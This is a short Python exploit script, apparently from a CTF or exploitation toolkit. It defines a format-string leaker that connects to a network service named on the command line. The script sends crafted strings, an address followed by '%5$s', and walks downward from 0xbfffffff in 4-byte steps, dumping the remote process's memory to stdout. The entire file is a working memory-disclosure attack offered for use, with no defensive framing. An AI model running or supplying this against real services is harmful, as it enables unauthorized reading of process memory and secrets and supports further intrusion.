import logging
import sys

from leak.leak import TCPLeaker
from leak.base import RegexParser
from leak.utils import convert_address_to_string


logger = logging.getLogger(__name__)


class FMTLeaker(TCPLeaker):
    def __init__(self, host, port, base_address, direction=True):
        super(FMTLeaker, self).__init__(host, port, parser=RegexParser(r'....(.+)'))
        self.offset = 0
        self.base_address = base_address
        self.direction = direction

    def get_next_input_parameter(self):
        address = self.base_address + (self.offset * (+1 if self.direction else -1))
        logger.debug('address %08x' % address)
        fmt_string = convert_address_to_string(address) + '%5$s'

        self.offset += 4 # 4 bytes at the times

        return fmt_string

    def output(self, leak):
        sys.stdout.write(leak)
        sys.stdout.flush()




if __name__ == '__main__':
    logging.basicConfig(level=logging.DEBUG)

    host = sys.argv[1]
    port = sys.argv[2]

    leaker = FMTLeaker(host, port, 0xbfffffff, direction=False)
    leaker()